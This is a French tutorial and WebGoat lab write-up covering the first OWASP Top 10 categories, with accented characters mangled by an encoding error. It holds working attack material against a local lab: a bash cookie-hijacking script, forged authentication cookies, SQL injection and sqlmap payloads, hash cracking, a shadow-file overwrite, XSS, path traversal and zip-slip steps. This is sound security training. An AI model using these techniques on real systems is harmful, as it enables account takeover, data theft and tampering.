
# D√©couverte OWASP

# **D√©couverte des vuln√©rabilit√©s r√©f√©renc√©es par l‚ÄôOWASP**

Dans ce document nous d√©couvrirons un ensemble de vuln√©rabilit√©s class√©es par l‚ÄôOWASP et leur d√©tection dans le cadre d‚Äôun ¬´ pen-testing ¬ª.

L'OWASP (Open Worldwide Application Security Project) est une association mettant en avant les diff√©rentes failles connues sur les applications (principalement web) et les moyens de s'en prot√©ger. L'organisme effectue un classement r√©gulier des vuln√©rabilit√©s les plus exploit√©es sur Internet pour former les testeurs de s√©curit√© √† leur d√©tection et les d√©veloppeurs √† leur compr√©hension et √† la correction du code.

L'OWASP propose divers projets, et nous nous int√©resserons ici au sujet principal : le classement des **10 vuln√©rabilit√©s les plus exploit√©es sur Internet**. Pour effectuer cette √©tude, nous nous baserons sur le site officiel de l'OWASP et sur une application r√©pertoriant des exemples des diff√©rents types de vuln√©rabilit√©s √©tudi√©es. L‚Äôapplication WebGoat est ainsi d√©velopp√©e par l‚ÄôOWASP pour comprendre les diff√©rents types de vuln√©rabilit√©s et leurs impacts.

Nous travaillerons ainsi sur les **5 premi√®res vuln√©rabilit√©s** du top 10 de l'OWASP (version 2021, car ce classement est actualis√© tous les 4 ans).

**Les vuln√©rabilit√©s de l‚ÄôOWASP**

L'OWASP classe les vuln√©rabilit√©s en cat√©gories sp√©cifiques :

- **A01:2021 - Broken Access Control**
- **A02:2021 - Cryptographic Failures**
- **A03:2021 - Injection**
- **A05:2021 - Security Misconfiguration**

    Chacune de ces cat√©gories correspond √† un ensemble de ¬´ faiblesses ¬ª **CWE (Common Weakness Enumeration)** qui d√©finissent des causes probables de vuln√©rabilit√©s futures.

L'organisation √† but non lucratif **MITRE** est √† l'origine des classifications des diff√©rentes faiblesses, dans le but de d√©finir les vuln√©rabilit√©s connues √† surveiller en urgence : les **CVE (Common Vulnerability and Exposure / Common Vulnerability Enumeration)**.



>En 1999, MITRE a √©tabli une classification des menaces permettant de se prot√©ger et de configurer les √©quipements IDS pour pr√©venir l'exploitation des menaces r√©centes sur les syst√®mes d'information.

- Les CVE poss√®dent un identifiant unique permettant de retrouver une vuln√©rabilit√© et un contexte pr√©cis d‚Äôexploitation (version du programme touch√©, syst√®me d‚Äôexploitation touch√©, CWE li√©es √† ce type de vuln√©rabilit√©, risques encourus)
- Les CWE classent de mani√®re g√©n√©rique les types de vuln√©rabilit√© et leurs impacts sur les syst√®mes touch√©s.

Ce document n‚Äô√©tant pas un rempla√ßant du site officiel de l‚ÄôOWASP, celui-ci devra √™tre utilis√© tout au long de l‚Äô√©tude pour comprendre les diff√©rentes implications des vuln√©rabilit√© et faiblesses √©tudi√©es.

Nous √©tudierons ici les outils utiles √† la r√©alisation des test effectu√©s dans l‚Äôapplication WebGoat. Ainsi que quelques astuces vous permettant de progresser dans cet apprentissage.

Installation de l‚Äôapplication WebGoat

J‚Äôutiliserais ici l‚Äôapplication dans un conteneur sur une machine Kali Linux pour avoir √† port√©e de main les diff√©rents outils permettant de tester mon application.

```bash
apt install docker.io
docker pull webgoat/webgoat
docker create -ti ‚Äîname webgoat -p 8080:8080 -p 9090:9090 -e TZ=Europe/Paris webgoat/webgoat

```

Pour les premi√®res le√ßons de l‚Äôapplication WebGoat, vous aurez besoin d‚Äôutiliser les outils de d√©veloppeur de votre navigateur, en appuyant sur la touche f12 de votre clavier une partie outils d√©veloppeurs appara√Æt sur la page.

![images/image1.png](images/image1.png)

1. (A1) Broken Access Control
    
    <aside>
    
    *Hijack a session*
    
    > Le session Hijacking est le fait de voler la session d‚Äôun autre utilisateur, il repose la plupart du temps sur l‚Äôutilisation d‚Äôun moyen d‚Äôauthentification autre que le nom et le mot de passe de l‚Äôutilisateur (comme un cookie d‚Äôauthentification).
    >
    <details>
    <summary>- Hijack a session - 5</summary>
        
   Dans la partie storage vous trouverez les cookies li√©s √† la page sur laquelle vous vous connectez. Pour la premi√®re le√ßon (Hijack a session) il s‚Äôagit de deviner le cookie d‚Äôun utilisateur.
        
   Pour r√©aliser ce challenge je note le cookie r√©cup√©r√© par l‚Äôutilisateur julien :
   >    
   > üç™  Hijack_cookie : 999666930232324123-1739829095375 
   >    
        Puis je supprime le cookie et remplie √† nouveau le formulaire pour comparer son cookie :
        
        <aside>
        üç™
        
        Hijack_cookie : 999666930232324124-1739829895548
        
        </aside>
        
        En r√©p√©tant l‚Äôop√©ration √† de multiple reprises je remarque que certains num√©ros sont saut√©s pour le premier nombre. Un cookie a donc √©t√© donn√© √† un autre utilisateur, je peux donc utiliser cette valeur comme base pour trouver le cookie de l‚Äôutilisateur. En effectuant une recherche sur internet sur la deuxi√®me valeur je constate qu‚Äôil s‚Äôagit d‚Äôun timestamp depuis l‚Äô√©poque unix (1 janvier 1970). Je peux donc tenter la premi√®re valeur trouv√©e en r√©duisant le timestamp d‚Äôune unit√© depuis que le cookie √† √©t√© trouv√©. En proc√©dant ainsi je suis s√ªr de pouvoir trouver le cookie d‚Äôun utilisateur. Je pourrais donc utiliser le script suivant pour trouver le cookie √† coup s√ªr :
        
        ```bash
        #!/bin/bash
        if [[ -z $1 ]] || [[ -z $2 ]] || [[ -z $3 ]] || [[ -z $4 ]] || [[ -z $5 ]] || [[ -z $6 ]] ; then { 
          echo "donner la valeur du jeton JSESSIONID, votre nom d'utilisateur et votre mot de passe"
        	echo "-s JSESSIONID"
        	echo "-u username"
        	echo "-p password"
        	echo "Usage: $0 -u julien -p poseidon -s sLdOKMWBs9rchRluZGhTFgRw6sNEaA5m94hdDSxs"
        	exit 1
        }
        fi
        options="$1 $3 $5"
        case $options in
        	"-s -u -p")
        			session=$2
        			user=$4
        			password=$6
        			;;
        	"-s -p -u")
        			session=$2
        			user=$6
        			password=$4
        			;;
        	"-u -s -p")
        			session=$4
        			user=$2
        			password=$6
        			;;
        	"-u -p -s")
        			session=$6
        			user=$2
        			password=$4
        			;;
        	"-p -s -u")
        			session=$4
        			user=$6
        			password=$2
        			;;
        	"-p -u -s")
        			session=$6
        			user=$4
        			password=$2
        			;;
        	*)
        			echo "donner la valeur du jeton JSESSIONID, votre nom d'utilisateur et votre mot de passe"
        			echo "-s JSESSIONID"
        			echo "-u username"
        			echo "-p password"
        			echo "Usage: $0 -u julien -p poseidon -s sLdOKMWBs9rchRluZGhTFgRw6sNEaA5m94hdDSxs"
        			exit 1
        			;;
        esac
        a=0
        jsession=$(curl -si "http://127.0.0.1:8080/WebGoat/login" -d "username=$user&password=$password" -v 2> /dev/null | grep JSESSIONID | cut -d "=" -f 2 | cut -d ";" -f 1)
        while true; do {
        	hijack1=$(curl -si "http://127.0.0.1:8080/WebGoat/HijackSession/login" -d "username=$user&password=password" -b "JSESSIONID=$jsession" -L -v 2> /dev/null| grep hijack_cookie | cut -d "=" -f 2 | cut -d ";" -f 1)
        	#echo "session=$jsession"
        	#echo "cookie=$hijack1"
        	current=$(echo $hijack1 | cut -d "-" -f 1)
        	if (($a != 0 )); then {
        		if [[ $current != $predict ]]; then {
        			echo "actuel: $current, pr√©vu: $predict"
        			time=$(echo $hijack1 | cut -d "-" -f 2)
        			for ((i=0;i<30;i++)); do {
        				jsession=$session
        				time=$(($time - 1))
        				hijack2="$predict-$time"
        				curl "http://127.0.0.1:8080/WebGoat/HijackSession/login" -d "username=jul&password=posei" -b "JSESSIONID=$jsession" -b "hijack_cookie=$hijack2" -L -v 2> /dev/null | grep Sorry > /dev/null
        				if (( $? != 0 )); then {
        					echo "bingo: $hijack2"
        					curl "http://127.0.0.1:8080/WebGoat/HijackSession/login" -d "username=jul&password=posei" -b "JSESSIONID=$jsession" -b "hijack_cookie=$hijack2" -L
        					break
        				}
        				fi
        			}
        			done
        			break
        		}
        		fi
        	}
        	fi
        	predict=$(($current + 1))
        	a=1
        }
        done
        ```
        
        Le script se connecte au serveur avec les identifiants entr√©s √† l‚Äôex√©cution puis r√©cup√®re un hijack_cookie aupr√®s du serveur, il incr√©mente ensuite le permier nombre pour pr√©dire la valeur du prochain cookie. Si le prochain cookie poss√®de la valeur pr√©vue il recommence l‚Äôop√©ration jusqu‚Äô√† ce que le cookie obtenu ne soit pas celui qui √©tait pr√©vu. A partir du moment ou ce cookie est identifi√© on d√©cr√©mente la valeur du deuxi√®me nombre (le timestamp) d‚Äôune unit√© pour trouver le cookie attendu.
        
        L‚Äôop√©ration est r√©p√©t√©e une trentaine de fois ce qui √©tait suffisant lors de mes tests.
        
    </aside>
    </details>    
    <aside>
    
    *Insecure Direct Object Reference*
    
    > L‚ÄôIDOR est un type de vuln√©rabilit√© permettant √† un attaquant d‚Äôutiliser une information propre √† un utilisateur pour pouvoir acc√©der aux donn√©es d‚Äôautres utilisateurs ( il s‚Äôagit la plupart du temps d‚Äôun identifiant li√© √† l‚Äôutilisateur connect√©).
    > 
    
    > Pour cette partie  j‚Äôutiliserais le logiciel ZAP (Zed Attack Proxy) cr√©√© par l‚ÄôOWASP. Ce logiciel agit comme serveur proxy et permet d‚Äôintercepter les connexions pour les analyser, ou les r√©p√©ter avec des param√®tres diff√©rents. Je serais ainsi capable de modifier les requ√™tes et pour tromper le serveur web sur lequel je me connecte.
    > 
    > 
    > Une fois lanc√© j‚Äôutiliserai le navigateur int√©gr√© √† Zaproxy pour me connecter √† webgoat.
    > 
    > ![images/image2.png](images/image2.png)
    > 
    - Insecure Direct Object References - 3
        
        Dans zap je peux observer la r√©ponse re√ßue :
        
        ![images/image3.png](images/image3.png)
        
    - Insecure Direct Object References - 5 part 1
        
        je r√©cup√®re la requ√™te avec zap et la r√©p√®te pour en modifier le contenu :
        
        ![images/image4.png](images/image4.png)
        
        Je choisirais Open/Resend with Request Editor pour modifier la requ√™te :
        
        ![images/image5.png](images/image5.png)
        
        Puis en testant plusieurs identifiant utilisateurs en d√©cr√©mentant et incr√©mentant l‚Äôidentifiant de tom je trouve celui de l‚Äôutilisateur Buffalo Bill.
        
    - Insecure Direct Object References - 5 part 2
        
        Pour la derni√®re partie l‚Äôobjectif √©tant de modifier la requ√™te http nous devons trouver un moyen d‚Äôenvoyer des modifications, je modifie donc la m√©thode de la requ√™te http :
        
        ![images/image6.png](images/image6.png)
        
        Ici la m√©thode POST n‚Äôest pas autoris√©e mais je d√©couvre 2 m√©thodes : PUT et GET qui sont autoris√©es. Je teste donc avec la m√©thode PUT :
        
        ![images/image7.png](images/image7.png)
        
        Cette fois le media-type n‚Äôest pas autoris√© mais le content-type est application/json, je le modifie donc et tente d‚Äôenvoyer les modifications demand√©es :
        
        ![images/image8.png](images/image8.png)
        
        Le profile de l‚Äôutilisateur Buffalo Bill est modifi√©.
        
    </aside>
    
    <aside>
    
    *Missing Function Level Access Control*
    
    > Il s‚Äôagit toutes les fonctions, autres que l‚ÄôIDOR. Permettant √† un utilisateur d‚Äôobtenir des acc√®s au donn√©es ou aux droits d‚Äôautres utilisateurs.
    > 
    - Missing Function Level Access Control - 2
        
        Nous devons trouver un menu cach√©, pour cela nous pouvons utiliser les outils d√©veloppeurs web du navigateur:
        
        ![images/image9.png](images/image9.png)
        
        Nous d√©couvrirons ici 2 cat√©gories cach√©es dans la page (attention elles sont sensibles √† la casse)
        
    - Missing Function Level Access Control - 3
        
        En utilisant √† nouveau zaproxy je tente de faire un get sur la page users trouv√©e pr√©c√©demment 
        
        ![images/image10.png](images/image10.png)
        
        A nouveau le type d‚Äôapplication ne semble pas correspondre (je modifierais pour application/json :
        
        ![images/image11.png](images/image11.png)
        
        La liste des utilisateurs r√©cup√©r√©e j‚Äôobtiens le hash de l‚Äôutilisateur jerry.
        
    - Missing Function Level Access Control - 4
        
        Dans la derni√®re partie les d√©veloppeurs ont corrig√© le probl√®me en autorisant seulement les administrateurs √† acc√©der aux informations. J‚Äôutiliserais donc une technique semblable √† celle utilis√©e dans la le√ßon sur l‚ÄôIDOR pour obtenir les droits administrateurs :
        
        ![images/image12.png](images/image12.png)
        
        La requ√™te semble fonctionner mais le password n‚Äôest pas pris en compte :
        
        ![images/image13.png](images/image13.png)
        
        N‚Äôayant pas d‚Äôacc√®s √† la page users-admin-fix je passe le compte julien que j‚Äôutilise pour effectuer l‚Äô√©l√©vation de privil√®ges :
        
        ![images/image14.png](images/image14.png)
        
        La page users-admin-fix devient accessible :
        
        ![images/image15.png](images/image15.png)
        
    </aside>
    
    <aside>
    
    *Spoofing an Authentication Cookie*
    
    > Dans cette partie il s‚Äôagira de deviner la m√©thode utilis√©e pour cr√©er des cookies d‚Äôauthentification et de l‚Äôutiliser pour se cr√©er un cookie valable pour se connecter avec les droits d‚Äôun autre utilisateur.
    > 
    - Spoofing an Authentication Cookie - 2
        
        J‚Äôobserve le cookie spoof_auth obtenu et remarque qu‚Äôil semble √™tre en encodage base64, je tente donc de le d√©coder :
        
        ```bash
        echo "NDM2YzdhNTU3NzYxNTk0ZjY3NzA3NDYxNmY2NzYyNjU3Nw==" | base64 -d
        436c7a557761594f677074616f67626577
        ```
        
        Le r√©sultat semble √™tre un code hexad√©cimal :
        
        ```bash
        echo 436c7a557761594f677074616f67626577 | xxd -r -p
        ClzUwaYOgptaogbew
        ```
        
        J‚Äôobserve la pr√©sence du login/motdepasse pr√©sent dans la cha√Æne de caract√®re produite en invers√© :
        
        ```bash
        echo 436c7a557761594f677074616f67626577 | xxd -r -p | rev
        webgoatpgOYawUzlC
        ```
        
        Je v√©rifie avec le login admin et constate le m√™me r√©sultat, il me suffit donc d‚Äôinverser le proc√©der pour cr√©er un cookie pour n‚Äôimporte quel utilisateur dont je connais le login :
        
        ```bash
        echo -n tompgOYawUzlC | rev | xxd -p | base64 NDM2YzdhNTU3NzYxNTk0ZjY3NzA2ZDZmNzQK
        ```
        
        Suite √† diff√©rents test je me rend compte qu‚Äôun retour √† la ligne corromps la cha√Æne de caract√®re je supprime donc le retour √† la ligne avant d‚Äôencoder en base64 :
        
        ```bash
        echo -n "tompgOYawUzlC" | rev | xxd -p| tr -d '\n'|base64
        NDM2YzdhNTU3NzYxNTk0ZjY3NzA2ZDZmNzQ=
        ```
        
    </aside>
    
2. (A2) Cryptographic Failures
    
    <aside>
    
    *Crypto Basics*
    
    > Les m√©thodes de chiffrement, encodage, et hachage sont couramment utilis√©es par les application pour authentifier les utilisateurs , transmettre leurs donn√©es et les s√©curiser. Pourtant les m√©thodes utilis√©e peuvent ne pas √™tre adapt√©es et conduire √† une compromission des donn√©es. De m√™me les technologies utilis√©es doivent faire l‚Äôobjet d‚Äôune veille constante et √™tre mises √† jour d√®s que n√©cessaire.
    > 
    - Crypto Basics - 3
        
        J‚Äôutiliserai CyberChef sur internet :
        
        ![images/image16.png](images/image16.png)
        
        Ici je tente de bruteforcer le ou exclusif pour r√©cup√©rer le mot de passe apr√®s avoir d√©coder les caract√®res en base64. En effet l‚Äôop√©ration ¬´ ou exclusif ¬ª s‚Äôex√©cute en binaire et peut convertir certains caract√®res dans des code binaire non interpr√©tables par un terminal, le r√©sultat de l‚Äôop√©ration est donc encod√© en base64(attention le mot de passe trouv√© n‚Äôest pas dans la casse attendue par le formulaire).
        
    - Crypto Basics - 4
        
        je choisirais ici le programme hashcat pour pouvoir cracker le hash propos√© :
        
        ```bash
        hashid -m '21232F297A57A5A743894A0E4A801FC3'
        hashcat -m 0 '21232F297A57A5A743894A0E4A801FC3' /usr/share/wordlists/rockyou.txt 
        ```
        
        ```bash
        hashid -m '8F0E2F76E22B43E2855189877E7DC1E1E7D98C226C95DB247CD1D547928334A9'
        hashcat -m 1400 '8F0E2F76E22B43E2855189877E7DC1E1E7D98C226C95DB247CD1D547928334A9' /usr/share/wordlists/rockyou.txt
        
        ```
        
    - Crypto Basics - 6
        
        J‚Äô enregistre la cl√© priv√©e donn√©e dans fichier nomm√© private.rsa , puis je g√©n√®re une cl√© publique correspondante :
        
        ```bash
        openssl rsa -in private.rsa -pubout > pub.rsa
        ```
        
        depuis la cl√© publique j‚Äôextrait le modulus :
        
        ```bash
        openssl rsa -in pub.rsa -pubin -modulus -noout | cut -d "=" -f 2 > modulus.txt
        ```
        
        puis je sign le modulus en sha256 en utilisant la cl√© priv√©e :
        
        ```bash
        cat modulus.txt | tr -d '\n' | openssl dgst -sha256 -sign private.rsa | base64
        ```
        
    - Crypto Basics - 8
        
        J‚Äôextrais le fichier shadow du conteneur pour obtenir le droit d‚Äôacc√®s sur le fichier puis je d√©chiffre le message gr√¢ce √† la passphrase :
        
        ```bash
        docker cp youthful_hodgkin:/etc/shadow .
        pass=$(openssl passwd -6 poseidon) && sed -i "/root/ s/\*/$pass/" shadow
        docker cp shadow youthful_hodgkin:/etc/shadow
        docker exec -ti youthful_hodgkin bash
        su ‚Äì
        cat default_secret
        echo "U2FsdGVkX199jgh5oANElFdtCxIEvdEvciLi+v+5loE+VCuy6Ii0b+5byb5DXp32RPmT02Ek1p f55ctQN+DHbwCPiVRfFQamDmbHBUpD7as=" | openssl enc -aes-256-cbc -d -a -k ThisIsMySecretPassw0rdF0rY0u
        
        ```
        
    </aside>
    
3. (A3) Injection
    
    <aside>
    
    *SQL Injection (intro)*
    
    > L‚Äôinjection SQL est un type de vuln√©rabilit√© permettant √† un attaquant de sortir du cadre pr√©vu par l‚Äôapplication pour interroger sa base de donn√©es. Il devient possible (la plupart du temps par le biais de formulaires html dont les entr√©es ne sont pas assez restrictives) d‚Äôacc√©der √† d‚Äôautres informations stock√©es dans la base de donn√©e, voir de les modifier.
    > 
    - SQL Injection (intro) - 10
        
        Apr√®s diff√©rents essais le champs login_count ne semble pas vuln√©rable aux injections SQL, mais User_Id peut √™tre inject√© :
        
        ![images/image17.png](images/image17.png)
        
    - SQL Injection (intro) - 11
        
        Le m√™me principe est utilisable dans cette le√ßon en utilisant les commentaires sql :
        
        ![images/image18.png](images/image18.png)
        
    - SQL Injection (intro) - 12
        
        Nous utiliserons le m√™me concept mais en ajoutant cette fois une commande de mise √† jour de la table :
        
        ```sql
        'update employees set salary=91000 where userid=37648; --
        ```
        
    - SQL Injection (intro) - 13
        
        Nous utiliserons le m√™me principe d‚Äôencha√Ænement des requ√™tes pour supprimer la table des logs :
        
        ![images/image19.png](images/image19.png)
        
    </aside>
    
    <aside>
    
    *SQL Injection (advanced)*
    
    - SQL Injection (advanced) - 3
        
        ```sql
        ';select * from user_system_data; --
        ```
        
        En essayant de r√©aliser l‚Äôinjection suivante :
        
        ```sql
        ' union select password from user_system_data ‚Äì
        ```
        
        Je remarque que le nombre de colonnes ne correspond pas :
        
        ![images/image20.png](images/image20.png)
        
        Il faudra donc faire correspondre le nombre de colonne de la deuxi√®me requ√™te avec la premi√®re (une * donc toutes les colonnes de la premi√®re table) :
        
        ```sql
        ' union select null,password,user_name,null,null,null,null from user_system_data ‚Äì
        ```
        
        ![images/image21.png](images/image21.png)
        
    - SQL Injection (advanced) - 5
        
        J‚Äôutiliserais l‚Äôoutil sqlmap pour tester les diff√©rents types d‚Äôinjection sql disponibles, apr√®s avoir test√© les pages challenge_login et challenge deux injection sont possibles sur le param√®tre username_reg :
        
        ```bash
        sqlmap -u http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge --data="username_reg=test&email_reg=bob%40mail.com&password_reg=po&confirm_p assword_reg=test" --cookie="JSESSIONID=0txqnMhhofk6DP1OdGeKIItd8yPCW95jNQUolcwn" --method PUT --level 5 --risk 3 -p username_reg
        ```
        
        ![images/image22.png](images/image22.png)
        
        En utilisant la technique boolean-based blind j‚Äôarrive √† d√©terminer si une requ√™te sql obtient une r√©ponse positive ou non :
        
        ![images/image23.png](images/image23.png)
        
        Ici le r√©sultat de la requ√™te n‚Äôest pas consid√©r√©e comme vraie , il n‚Äôy a donc pas de conflit avec un utilisateur existant, le syst√®me consid√®re qu‚Äôil peut cr√©er le compte.
        
        En effectuant un test avec les diff√©rentes lettres je trouve celle-ci :
        
        ![images/image24.png](images/image24.png)
        
        Cette fois le retour de la requ√™te est positif, la premi√®re lettre du mot de passe est un t. Il suffit dont de tester les diff√©rentes lettres pour trouver le mot de passe complet.
        
        Pour cela j‚Äôutiliserais le programme burpsuite en for√ßant les caract√®res √† utiliser dans ce param√®tre. La fonctionnalit√© intruder de burp permettra d‚Äôeffectuer cette manipulation.
        
        Burp joue le r√¥le de proxy tout comme zap et je l‚Äôutiliserais dans un premier temps pour capturer le trafique envoy√© par mon navigateur (attention de bien g√©rer les param√®tres de proxy du navigateur, les ports √† utiliser puisque WebGoat utilise le port 8080 qui est aussi celui par d√©faut de burp, de plus il faut penser que le navigateur n‚Äôutilise pas de proxy pour se connecter √† une adresse en 127.0.0.1, il faudra donc utiliser l‚Äôadresse IP de la machine h√¥te pour pouvoir se connecter √† l‚Äôinterface de webgoat).
        
        ![images/image25.png](images/image25.png)
        
        Je choisi ensuite d‚Äôenvoyer cette requ√™te vers l‚Äôintruder :
        
        ![images/image26.png](images/image26.png)
        
        Puis je modifie la requ√™te pour envoyer diff√©rents param√®tres √† la cha√Æne :
        
        ![images/image27.png](images/image27.png)
        
        Le param√®tre username_reg test ici si la longueur du mot de passe est √©gale √† num (ce qui ne peut pas √™tre vrai puisqu‚Äôon fait ici une comparaison entre un entier et une cha√Æne de caract√®res. Attention pour que la requ√™te puisse √™tre envoy√©e il faudra convertir la valeur du param√®tre en encodage url :
        
        ![images/image28.png](images/image28.png)
        
        Et il ne reste plus qu‚Äôa s√©lectionner le param√®tre √† tester en choisissant ¬´ add payload position ¬ª:
        
        ![images/image29.png](images/image29.png)
        
        Un panneau de param√©trage de la payload appara√Æt, je choisis des nombres √† incr√©menter de 1 entre 1 et 50 pour d√©terminer la longueur du mot de passe de tom :
        
        ![images/image30.png](images/image30.png)
        
        Dans la partie settings j‚Äôajoute un Grep ‚Äì Match avec une expression pr√©sente dans la r√©ponse √† ma requ√™te si le r√©sultat est vrai (User {0} already exists ‚Ä¶), je choisi ici le mot exists :
        
        ![images/image31.png](images/image31.png)
        
        Il ne me reste plus qu‚Äô√† lancer l‚Äôattaque et √† observer la colonne exists :
        
        ![images/image32.png](images/image32.png)
        
        Le mot de passe √† donc 23 caract√®res.
        
        Il est possible cumuler deux payload avec burp intruder pour tester les diff√©rentes combinaisons de caract√®res pour la premi√®re lettre du mot de passe, puis toutes les combinaisons de caract√®res pour la deuxi√®me lettre et ainsi de suite pour les 23 caract√®res du mot de passe. Pour cela je choisi un type d‚Äôattaque Cluster bomb attack, puis je d√©signe la partie position de substring comme √©tant un nombre incr√©ment√© de 1 entre 1 et 23 :
        
        ![images/image33.png](images/image33.png)
        
        Je param√®tre ensuite la deuxi√®me payload comme √©tant un caract√®re entre a et z (ma requ√™te analyse seulement les caract√®res en minuscule pour gagner du temps, il sera ensuite possible de tester la casse une fois le mot de passe connu) :
        
        ![images/image34.png](images/image34.png)
        
        Il n‚Äôy a plus qu‚Äôa lancer l‚Äôattaque et voir si nous r√©cup√©rons une partie des 23 caract√®res (si certains caract√®res manquent nous pourrons tester les caract√®res sp√©ciaux et nombres) :
        
        ![images/image35.png](images/image35.png)
        
        Quand l‚Äôattaque est finie nous optenons le mot de passe :
        
        thisisasecretfortomonly
        
    </aside>
    
    <aside>
    
    *Cross Site Scripting*
    
    > Le XSS (Cross Site Scripting), consiste √† injecter (la plupart du temps dans un formulaire, mais l‚Äôinjection pourrais aussi se faire dans les ent√™tes html, les cookies etc.) un script javascript ex√©cut√© sur la machine d‚Äôun client. Il est ainsi possible d‚Äôex√©cuter du code sur la machine d‚Äôun autre utilisateur se connectant au site vuln√©rable. La plupart du temps le code ex√©cut√© sur la machine de la victime visera √† lui voler des informations d‚Äôauthentification stock√©es dans les cookies par exemple.
    On distinguera ici les XSS n√©cessitant de tromper l‚Äôutilisateur en lui envoyant un lien g√©n√©rant du code malveillant et une Stored XSS √©tant stock√©e dans la base de donn√©e du server, ou ses fichiers.
    > 
    - Cross Site Scripting - 7
        
        Nous pouvons tester d‚Äôenvoyer le code :
        
        ```jsx
        <script> alert("hello")</script>
        ```
        
        Dans les diff√©rentes parties du formulaire. Si une fen√™tre appara√Æt en indiquant le message hello, vous avez trouv√© le champ vuln√©rable.
        
    - Cross Site Scripting - 10
        
        en analysant le code GoatRouter.js dans la partie debugger de la console developer du navigateur on trouve une route test
        
    - Cross Site Scripting - 11
        
        en allant dans un nouvel onglet et en appelant :
        [http://192.168.189.50:8080/WebGoat/start.mvc?username=julien#test](http://192.168.189.50:8080/WebGoat/start.mvc?username=julien#test/)/%3Cscript%3Ewebgoat.customjs.phoneHome%28%29%3C%2Fscript%3E
        
        Un message contenant un num√©ro s‚Äôaffiche dans la console du navigateur
        
        Le message envoy√© √† la route test est :
        
        ```jsx
        <script>webgoat.customjs.phoneHome()</script>
        ```
        
        Mais les caract√®res sp√©ciaux sont encod√©s pour √™tre correctement interpr√©t√©s par le navigateur.
        
    </aside>
    
    <aside>
    
    *Cross Site Scripting (stored)*
    
    - Cross Site Scripting (stored) - 3
        
        Nous pourrons directement inclure notre payload sans avoir besoin de l‚Äôencoder, cette fois la payload est sauvegard√©e dans les donn√©es du site (certainement dans une base de donn√©e) et d√®s qu‚Äôun utilisateur acc√®de √† la page le script est ex√©cut√©.
        
    </aside>
    
    <aside>
    
    *Path traversal*
    
    > La Path traversal est un type de vuln√©rabilit√© permettant √† l'attaquant de changer l‚Äôendroit ou les donn√©es d‚Äôun serveur web sont lues ou √©crites. Il devient ainsi possible pour l‚Äôattaquant de lire des fichiers qui n‚Äôappartiennent pas au champs de l‚Äôapplication concern√©e, voir de modifier des fichiers syst√®mes.
    > 
    - Path traversal - 2
        
        Nous devons envoyer une image sur le serveur lorsque le formulaire est utilis√© normalement nous avons :
        
        ![images/image36.png](images/image36.png)
        
        On peut remarque que le nom choisi appara√Æt dans le chemin de stockage de l‚Äôimage, nous pouvons influer sur le chemin en changeant le nom pour ../hello
        
    - Path traversal - 4
        
        Le probl√®me √† ici √©t√© corrig√©.
        Le nom n‚Äôappara√Æt plus dans le chemin de stockage de l‚Äôimage, mais le nom de l‚Äôimage lui-m√™me est utilis√© tel quel. Nous pouvons donc modifier le nom de l‚Äôimage pour choisir sa destination. J‚Äôutiliserais ici la fonction r√©p√©teur de burp pour modifier le nom de l‚Äôimage :
        
        ![images/image37.png](images/image37.png)
        
    - Path traversal - 5
        
        En analysant les requ√™tes avec burp on trouve l‚Äôurl :
        
        le param√®tre id=10 permet d‚Äôexploiter un path traversal √† l‚Äôaide d‚Äôencodage url : 
        
        ```bash
        /WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret
        ```
        
        Le .jpg est ajout√© automatiquement √† chaque requ√™te
        
    - Path traversal - 7
        
        Pour cette derni√®re partie le chemin de l‚Äôimage qui est contenu dans le fichier zip doit contenir le path traversal. Ici il faudra recr√©er le chemin que nous voulons √©craser : mkdir -p challenge7/home/webgoat/.webgoat-2023.8/PathTraversal/julien/ copier une image dans le dernier r√©pertoire
        
        ```bash
        ls challenge7/home/webgoat/.webgoat-2023.8/PathTraversal/julien/
        image.jpg
        puis rentrer dans deux niveaux de r√©pertoires :
        cd challenge7/home
        enfin compresser l‚Äôimage avec un chemin relatif :
        zip file.zip ../../home/webgoat/.webgoat-2023.8/PathTraversal/julien/image.jpg
        ```
        
        En envoyant le fichier zip l‚Äôimage extraite le sera √† l‚Äôendroit choisi !
        
    </aside> 
